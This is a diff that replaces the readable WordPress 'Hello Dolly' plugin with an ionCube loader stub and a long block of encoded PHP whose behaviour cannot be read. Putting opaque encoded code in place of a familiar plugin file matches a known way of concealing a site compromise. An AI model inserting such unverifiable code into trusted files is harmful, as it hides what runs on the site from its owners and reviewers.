@@ -1,81 +1,42 @@
-<?php
-/**
- * @package Hello_Dolly
- * @version 1.7
- */
-/*
-Plugin Name: Hello Dolly
-Plugin URI: http://wordpress.org/plugins/hello-dolly/
-Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
-Author: Matt Mullenweg
-Version: 1.7
-Author URI: http://ma.tt/
-*/
-
-function hello_dolly_get_lyric() {
-	/** These are the lyrics to Hello Dolly */
-	$lyrics = "Hello, Dolly
-Well, hello, Dolly
-It's so nice to have you back where you belong
-You're lookin' swell, Dolly
-I can tell, Dolly
-You're still glowin', you're still crowin'
-You're still goin' strong
-I feel the room swayin'
-While the band's playin'
-One of our old favorite songs from way back when
-So, take her wrap, fellas
-Dolly, never go away again 
-Hello, Dolly
-Well, hello, Dolly
-It's so nice to have you back where you belong
-You're lookin' swell, Dolly
-I can tell, Dolly
-You're still glowin', you're still crowin'
-You're still goin' strong
-I feel the room swayin'
-While the band's playin'
-One of our old favorite songs from way back when
-So, golly, gee, fellas
-Have a little faith in me, fellas
-Dolly, never go away
-Promise, you'll never go away
-Dolly'll never go away again";
-
-	// Here we split it into lines
-	$lyrics = explode( "\n", $lyrics );
-
-	// And then randomly choose a line
-	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
-}
-
-// This just echoes the chosen line, we'll position it later
-function hello_dolly() {
-	$chosen = hello_dolly_get_lyric();
-	echo "<p id='dolly'>$chosen</p>";
-}
-
-// Now we set that function up to execute when the admin_notices action is called
-add_action( 'admin_notices', 'hello_dolly' );
-
-// We need some CSS to position the paragraph
-function dolly_css() {
-	// This makes sure that the positioning is also good for right-to-left languages
-	$x = is_rtl() ? 'left' : 'right';
-
-	echo "
-	<style type='text/css'>
-	#dolly {
-		float: $x;
-		padding-$x: 15px;
-		padding-top: 5px;		
-		margin: 0;
-		font-size: 11px;
-	}
-	</style>
-	";
-}
-
-add_action( 'admin_head', 'dolly_css' );
-
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
+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
+eS1rv/41GhRoqCcZvQrCjm==
